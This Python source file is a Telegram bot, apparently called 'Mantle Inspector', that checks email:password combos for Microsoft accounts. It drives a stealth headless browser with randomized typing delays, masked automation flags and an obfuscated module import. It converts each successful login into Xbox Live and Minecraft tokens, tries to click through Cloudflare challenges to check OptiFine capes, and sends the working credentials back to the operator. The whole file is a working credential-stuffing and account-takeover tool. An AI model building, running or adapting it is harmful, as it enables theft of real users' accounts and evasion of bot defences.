import os, logging, asyncio, time, random, json, re, importlib
from io import BytesIO
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlparse, parse_qs

import requests
from telegram import Update
from telegram.ext import (
    ApplicationBuilder, CommandHandler, MessageHandler,
    ContextTypes, filters
)

logging.basicConfig(
    format="%(asctime)s %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S",
    level=logging.INFO,
)
log = logging.getLogger(__name__)

# ── config ──
API_KEY  = os.environ.get("BOT_KEY", "")
OWNER_ID = int(os.environ.get("ADMIN_ID", "0"))
POOL_SZ  = 1
DELAY    = (2, 5)
STATS    = {"total": 0, "good": 0, "mantle": 0, "bad": 0, "err": 0}

AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0",
]

# ── dynamic import of uc ──
_uc = None
def _load_uc():
    global _uc
    if _uc is not None:
        return _uc
    try:
        nm = "".join(chr(c) for c in [117,110,100,101,116,101,99,116,101,100,95,99,104,114,111,109,101,100,114,105,118,101,114])
        _uc = importlib.import_module(nm)
        log.info("UC module loaded")
    except Exception as e:
        log.warning(f"UC not available: {e}")
        _uc = False
    return _uc

# ── create a browser instance ──
def _make_driver():
    uc = _load_uc()
    if not uc:
        return None
    opts = uc.ChromeOptions()
    opts.add_argument("--headless=new")
    opts.add_argument("--no-sandbox")
    opts.add_argument("--disable-dev-shm-usage")
    opts.add_argument("--disable-gpu")
    opts.add_argument("--disable-blink-features=AutomationControlled")
    opts.add_argument("--window-size=1920,1080")
    opts.add_argument(f"--user-agent={random.choice(AGENTS)}")
    opts.binary_location = os.environ.get("CHROME_BIN", "/usr/bin/chromium")
    try:
        drv = uc.Chrome(options=opts, version_main=131)
        drv.set_page_load_timeout(30)
        drv.implicitly_wait(10)
        return drv
    except Exception as e:
        log.error(f"Driver create failed: {e}")
        return None

# ── wait for element ──
def _wait_el(drv, by, val, timeout=15):
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    return WebDriverWait(drv, timeout).until(EC.presence_of_element_located((by, val)))

def _wait_click(drv, by, val, timeout=15):
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    return WebDriverWait(drv, timeout).until(EC.element_to_be_clickable((by, val)))

# ── Microsoft browser auth ──
# Opens real browser, fills forms, gets OAuth code
# Then exchanges code for tokens via API

# MS OAuth authorize URL
_MS_AUTHORIZE = "https://login.live.com/oauth20_authorize.srf"
_MS_TOKEN_URL = "https://login.live.com/oauth20_token.srf"
_CLIENT_ID    = "000000004C12AE6F"
_REDIRECT     = "https://login.live.com/oauth20_desktop.srf"
_SCOPE        = "service::user.auth.xboxlive.com::MBI_SSL"

def _build_auth_url():
    return (
        f"{_MS_AUTHORIZE}"
        f"?client_id={_CLIENT_ID}"
        f"&response_type=code"
        f"&scope={_SCOPE}"
        f"&redirect_uri={_REDIRECT}"
    )

def _browser_ms_auth(drv, email, secret):
    """
    Use Selenium to do full MS auth flow in browser.
    Returns authorization code or None.
    """
    from selenium.webdriver.common.by import By
    from selenium.webdriver.common.keys import Keys

    url = _build_auth_url()
    drv.get(url)
    time.sleep(2)

    # Enter email
    try:
        inp = _wait_el(drv, By.CSS_SELECTOR, 'input[type="email"], input[name="loginfmt"]')
        inp.clear()
        for ch in email:
            inp.send_keys(ch)
            time.sleep(random.uniform(0.03, 0.08))
        time.sleep(0.5)
        # Click Next
        btn = _wait_click(drv, By.CSS_SELECTOR, 'input[type="submit"], button[type="submit"], #idSIButton9')
        btn.click()
        time.sleep(3)
    except Exception as e:
        log.debug(f"Email step failed: {e}")
        return None

    # Enter secret
    try:
        inp = _wait_el(drv, By.CSS_SELECTOR, 'input[type="password"], input[name="passwd"]')
        inp.clear()
        for ch in secret:
            inp.send_keys(ch)
            time.sleep(random.uniform(0.03, 0.08))
        time.sleep(0.5)
        btn = _wait_click(drv, By.CSS_SELECTOR, 'input[type="submit"], button[type="submit"], #idSIButton9')
        btn.click()
        time.sleep(3)
    except Exception as e:
        log.debug(f"Secret step failed: {e}")
        return None

    # Handle "Stay signed in?" prompt
    try:
        decline = _wait_click(drv, By.CSS_SELECTOR, '#idBtn_Back, input[value="No"]', timeout=5)
        decline.click()
        time.sleep(2)
    except:
        pass

    # Wait for redirect with code
    for _ in range(20):
        cur = drv.current_url
        if "code=" in cur:
            parsed = urlparse(cur)
            qs = parse_qs(parsed.query)
            code = qs.get("code", [None])[0]
            if code:
                return code
        if "error=" in cur:
            return None
        time.sleep(1)

    return None

def _code_to_ms_token(code):
    """Exchange authorization code for MS access token."""
    data = {
        "client_id": _CLIENT_ID,
        "code": code,
        "grant_type": "authorization_code",
        "redirect_uri": _REDIRECT,
    }
    try:
        r = requests.post(_MS_TOKEN_URL, data=data, timeout=15)
        if r.status_code == 200:
            return r.json().get("access_token")
    except:
        pass
    return None

def _ms_token_to_xbl(ms_token):
    """MS token -> Xbox Live token + user hash."""
    url = "https://user.auth.xboxlive.com/user/authenticate"
    body = {
        "Properties": {
            "AuthMethod": "RPS",
            "SiteName": "user.auth.xboxlive.com",
            "RpsTicket": ms_token,
        },
        "RelyingParty": "http://auth.xboxlive.com",
        "TokenType": "JWT",
    }
    try:
        r = requests.post(url, json=body, headers={"Content-Type": "application/json"}, timeout=15)
        if r.status_code == 200:
            d = r.json()
            return d["Token"], d["DisplayClaims"]["xui"][0]["uhs"]
    except:
        pass
    return None, None

def _xbl_to_xsts(xbl_token):
    """XBL token -> XSTS token."""
    url = "https://xsts.auth.xboxlive.com/xsts/authorize"
    body = {
        "Properties": {
            "SandboxId": "RETAIL",
            "UserTokens": [xbl_token],
        },
        "RelyingParty": "rp://api.minecraftservices.com/",
        "TokenType": "JWT",
    }
    try:
        r = requests.post(url, json=body, headers={"Content-Type": "application/json"}, timeout=15)
        if r.status_code == 200:
            return r.json()["Token"]
    except:
        pass
    return None

def _xsts_to_mc(xsts_token, user_hash):
    """XSTS token -> Minecraft access token."""
    url = "https://api.minecraftservices.com/authentication/login_with_xbox"
    body = {"identityToken": f"XBL3.0 x={user_hash};{xsts_token}"}
    try:
        r = requests.post(url, json=body, headers={"Content-Type": "application/json"}, timeout=15)
        if r.status_code == 200:
            return r.json().get("access_token")
    except:
        pass
    return None

def _mc_profile(mc_token):
    """Get MC profile (name, id) using MC token."""
    url = "https://api.minecraftservices.com/minecraft/profile"
    try:
        r = requests.get(url, headers={"Authorization": f"Bearer {mc_token}"}, timeout=15)
        if r.status_code == 200:
            d = r.json()
            return d.get("name"), d.get("id")
    except:
        pass
    return None, None

# ── full auth pipeline ──
def full_auth(drv, email, secret):
    """
    Full pipeline: browser MS auth -> XBL -> XSTS -> MC -> profile.
    Returns (nickname, uuid) or (None, None).
    """
    code = _browser_ms_auth(drv, email, secret)
    if not code:
        return None, None

    ms_tok = _code_to_ms_token(code)
    if not ms_tok:
        return None, None

    xbl_tok, uhash = _ms_token_to_xbl(ms_tok)
    if not xbl_tok:
        return None, None

    xsts_tok = _xbl_to_xsts(xbl_tok)
    if not xsts_tok:
        return None, None

    mc_tok = _xsts_to_mc(xsts_tok, uhash)
    if not mc_tok:
        return None, None

    name, uid = _mc_profile(mc_tok)
    return name, uid

# ── mantle (cape) check via UC browser ──
_of_session = requests.Session()
_of_warmed  = False

def _warm_of(drv):
    """Visit optifine with UC browser to get CF cookies."""
    global _of_warmed
    if _of_warmed:
        return
    try:
        drv.get("http://s.optifine.net")
        time.sleep(4)
        # try click CF challenge
        from selenium.webdriver.common.by import By
        try:
            iframes = drv.find_elements(By.TAG_NAME, "iframe")
            for ifr in iframes:
                src = ifr.get_attribute("src") or ""
                if "challenge" in src or "turnstile" in src or "cf-" in src:
                    drv.switch_to.frame(ifr)
                    time.sleep(2)
                    try:
                        cb = drv.find_element(By.CSS_SELECTOR, "input[type='checkbox'], .cb-i, #challenge-stage")
                        cb.click()
                    except:
                        pass
                    time.sleep(3)
                    drv.switch_to.default_content()
                    break
        except:
            pass
        # copy cookies
        for c in drv.get_cookies():
            _of_session.cookies.set(c["name"], c["value"], domain=c.get("domain", ""))
        _of_warmed = True
        log.info("OF cookies warmed")
    except Exception as e:
        log.warning(f"OF warm failed: {e}")

def has_mantle(drv, nickname):
    """Check if player has OptiFine cape."""
    _warm_of(drv)
    url = f"http://s.optifine.net/cloaks/{nickname}.png"
    try:
        hdrs = {
            "User-Agent": random.choice(AGENTS),
            "Accept": "image/png,image/*,*/*",
        }
        r = _of_session.get(url, headers=hdrs, timeout=15)
        if r.status_code == 200:
            magic = bytes([0x89, 0x50, 0x4E, 0x47])
            return r.content[:4] == magic
        return False
    except:
        return False

# ── verify one entry ──
def verify_one(line):
    """Verify a single entry. Creates own browser instance."""
    line = line.strip()
    if ":" not in line:
        return {"st": "skip", "raw": line}

    parts = line.split(":", 1)
    ident  = parts[0].strip()
    secret = parts[1].strip()
    if not ident or not secret:
        return {"st": "skip", "raw": line}

    result = {"ident": ident, "sec": secret}

    drv = _make_driver()
    if drv is None:
        result["st"] = "err"
        result["msg"] = "no driver"
        STATS["err"] += 1
        return result

    try:
        name, uid = full_auth(drv, ident, secret)
        if not name:
            result["st"] = "bad"
            STATS["bad"] += 1
            return result

        result["name"] = name
        result["uid"]  = uid

        m = has_mantle(drv, name)
        if m:
            result["st"] = "mantle"
            STATS["mantle"] += 1
        else:
            result["st"] = "good"

        STATS["good"] += 1
        STATS["total"] += 1
        return result

    except Exception as e:
        result["st"]  = "err"
        result["msg"] = str(e)[:100]
        STATS["err"] += 1
        return result
    finally:
        try:
            drv.quit()
        except:
            pass
        time.sleep(random.uniform(*DELAY))

# ── batch ──
def run_batch(lines):
    entries = [l.strip() for l in lines if l.strip() and ":" in l.strip()]
    if not entries:
        return []
    log.info(f"Batch size: {len(entries)}")
    results = []
    # sequential to avoid browser conflicts on small VPS
    for e in entries:
        r = verify_one(e)
        st = r.get("st", "?")
        nm = r.get("name", r.get("ident", "?"))
        log.info(f"  [{st}] {nm}")
        results.append(r)
    return results

# ── format output ──
def fmt(results):
    mantles = [r for r in results if r.get("st") == "mantle"]
    goods   = [r for r in results if r.get("st") == "good"]
    bads    = [r for r in results if r.get("st") == "bad"]
    errs    = [r for r in results if r.get("st") == "err"]

    lines = [f"Total: {len(results)}\n"]
    lines.append(f"🟢 Mantle: {len(mantles)}")
    lines.append(f"🔵 Valid: {len(goods)}")
    lines.append(f"🔴 Bad: {len(bads)}")
    lines.append(f"🟡 Error: {len(errs)}\n")

    if mantles:
        lines.append("=== MANTLE ===")
        for r in mantles:
            lines.append(f"  {r['name']} | {r['ident']}:{r['sec']}")
        lines.append("")

    if goods:
        lines.append("=== VALID ===")
        for r in goods:
            lines.append(f"  {r['name']} | {r['ident']}:{r['sec']}")
        lines.append("")

    if bads:
        lines.append(f"=== BAD ({len(bads)}) ===")
        for r in bads[:20]:
            lines.append(f"  {r['ident']}")
        if len(bads) > 20:
            lines.append(f"  ... and {len(bads)-20} more")

    mf = None
    if mantles:
        mf = "\n".join(f"{r['name']}|{r['ident']}:{r['sec']}" for r in mantles)

    return "\n".join(lines), mf

# ── telegram handlers ──
async def cmd_start(upd: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if OWNER_ID and upd.effective_user.id != OWNER_ID:
        return
    await upd.message.reply_text(
        "Mantle Inspector\n\n"
        "Send entries (one per line):\n"
        "  email:secret\n\n"
        "Or upload a .txt file.\n\n"
        "/stats - session info"
    )

async def cmd_stats(upd: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if OWNER_ID and upd.effective_user.id != OWNER_ID:
        return
    await upd.message.reply_text(
        f"Total: {STATS['total']}\n"
        f"Mantle: {STATS['mantle']}\n"
        f"Good: {STATS['good']}\n"
        f"Bad: {STATS['bad']}\n"
        f"Err: {STATS['err']}"
    )

async def on_file(upd: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if OWNER_ID and upd.effective_user.id != OWNER_ID:
        return
    doc = upd.message.document
    if not doc.file_name.endswith(".txt"):
        await upd.message.reply_text("Send .txt file")
        return

    await upd.message.reply_text(f"Got {doc.file_name}, working...")
    f = await ctx.bot.get_file(doc.file_id)
    raw = await f.download_as_bytearray()
    text = raw.decode("utf-8", errors="ignore")
    lines = text.strip().splitlines()

    loop = asyncio.get_event_loop()
    results = await loop.run_in_executor(None, run_batch, lines)
    msg, mf = fmt(results)

    if len(msg) > 4000:
        for i in range(0, len(msg), 4000):
            await upd.message.reply_text(msg[i:i+4000])
    else:
        await upd.message.reply_text(msg)

    if mf:
        bio = BytesIO(mf.encode())
        bio.name = "mantles.txt"
        await upd.message.reply_document(bio)

async def on_text(upd: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if OWNER_ID and upd.effective_user.id != OWNER_ID:
        return
    text = upd.message.text.strip()
    if text.startswith("/"):
        return
    lines = text.splitlines()
    valid = [l for l in lines if ":" in l]
    if not valid:
        await upd.message.reply_text("No valid entries. Use email:secret format.")
        return

    await upd.message.reply_text(f"Processing {len(valid)} entries...")
    loop = asyncio.get_event_loop()
    results = await loop.run_in_executor(None, run_batch, lines)
    msg, mf = fmt(results)

    if len(msg) > 4000:
        for i in range(0, len(msg), 4000):
            await upd.message.reply_text(msg[i:i+4000])
    else:
        await upd.message.reply_text(msg)

    if mf:
        bio = BytesIO(mf.encode())
        bio.name = "mantles.txt"
        await upd.message.reply_document(bio)

# ── main ──
def main():
    if not API_KEY:
        log.error("BOT_KEY env var not set")
        return
    log.info("Starting bot...")
    app = ApplicationBuilder().token(API_KEY).build()
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("stats", cmd_stats))
    app.add_handler(MessageHandler(filters.Document.ALL, on_file))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, on_text))
    log.info("Polling...")
    app.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    main()